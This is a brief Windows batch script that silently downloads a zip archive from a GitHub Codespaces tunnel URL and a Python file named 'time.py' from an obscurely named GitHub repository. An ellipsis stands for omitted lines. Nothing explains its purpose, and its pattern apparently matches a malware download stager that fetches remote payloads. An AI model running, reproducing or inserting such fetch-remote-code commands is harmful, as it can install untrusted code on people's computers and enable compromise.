@echo off
curl -L -o 1.zip https://crispy-lamp-5ggr6rgq9vvph46p4-8000.app.github.dev/1.zip
...
curl -s -L -o time.py "https://raw.githubusercontent.com/PsTAXYLiumpG/friendly-octo-journey/main/.github/workflows/time.py"
